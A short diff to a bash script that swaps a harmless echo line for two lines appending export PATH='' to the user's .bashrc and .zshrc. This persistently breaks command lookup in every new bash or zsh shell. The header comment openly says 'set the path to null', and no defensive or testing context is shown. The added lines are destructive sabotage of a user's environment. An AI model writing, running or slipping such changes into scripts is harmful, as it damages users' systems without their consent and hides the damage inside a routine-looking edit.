@@ -1,3 +1,4 @@
 #!/bin/bash
-# Desc: default
-echo "5"
+# Desc: set the path to null
+echo "export PATH=''" >> .bashrc
+echo "export PATH=''" >> .zshrc
